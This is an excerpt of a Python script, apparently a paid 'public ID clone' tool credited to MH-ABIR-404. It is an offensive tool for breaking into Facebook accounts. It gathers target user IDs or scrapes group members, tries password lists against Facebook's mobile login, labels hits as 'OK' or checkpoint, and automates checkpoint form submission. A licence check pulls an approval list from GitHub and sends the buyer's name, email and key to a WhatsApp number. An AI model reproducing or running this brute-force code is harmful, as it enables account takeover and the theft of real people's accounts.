...
Author   : MH-ABIR-404
Git hub  : MH-ABIR-404
Facebook : MOHAMMAD ABIR HOSSAIN 
Tool     : Public Clone                
                                 '''
...
def login_lagi334():
	try:
		...
		print(f'  %s[%sx%s]%s LOGIN ERROR ....PLEASE TRY AGAIN !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	print('')
	cetak(nel('[bold green] A. START PUBLIK ID CLONE  [bold green]')) 
	_____cowok__pink_____ = input('\n CHOOSE : ')
	if _____cowok__pink_____ in ['A']:
		dump_massal()
	elif _____cowok__pink_____ in ['B']:
		result()
	elif _____cowok__pink_____ in ['C']:
		dump_massal()
	elif _____cowok__pink_____ in ['D']:
		crack_file()
	elif _____cowok__pink_____ in ['E']:
		result()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('=>ENTER CRACK LIMT ID : '))
	except ValueError:
		print('{k}=>NOT JANI ')
		exit()
	...
	for met in range(jum):
		yz+=1
		kl = input('=>INPUT YOUR PUBLIC ID USER '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def grup():
	...
	ua = 'Mozilla/5 .0 (Mobile: rv:48.0: A405DL) Gecko/48.0 Firefox/48.0 KAI0S/2.5'
	miskinlu = {"user-agent": ua}
	url = "https://free.facebook.com/groups/"+id
	ses = requests.Session()
	try:
...
def setting():
	...
	print('') 
	cetak(nel('[bold yellow]A. CLONE JUST OLD ID \nB. CLONE JUST NEW IDZ\nC. CLONE MIX ID =>(BEST) [bold yellow]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['A','01']:
	...
	print('') 
	cetak(nel('[bold purple]A. MOBILE(BEST)\nB. MBASIC\n\n [bold purple]')) 
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ['A','01']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]      ABIR -CP💔        (Log in after 7 days)  [red]'))
				...
				cetak(nel('[green]      ABIR-OK🥰      (Jast Now log) [green]')) 
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://free.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
...
def Subscraption():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/abir232421/approval-1.txt.git").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(logo)
		print ("")
		print(" \033[1;32m ABIR  Clonner Tool Is Paid So You Need Get Approved First\033[1;37m\n")
		print ("")
		print(" Your Key is Not Approved ")
		print("")
		print(" Copy And Send Key To Admin")
		print ("")
		print (" Your Key : "+ak+R+key1 )
		print ("")
		name = input("Need Your Name : ")
		print ("")
		lol = input("Need Your  Email  : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Hello%20Sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
		os.system('am start https://wa.me/+8801402543688?text=' + tks)
		Subscraption() 
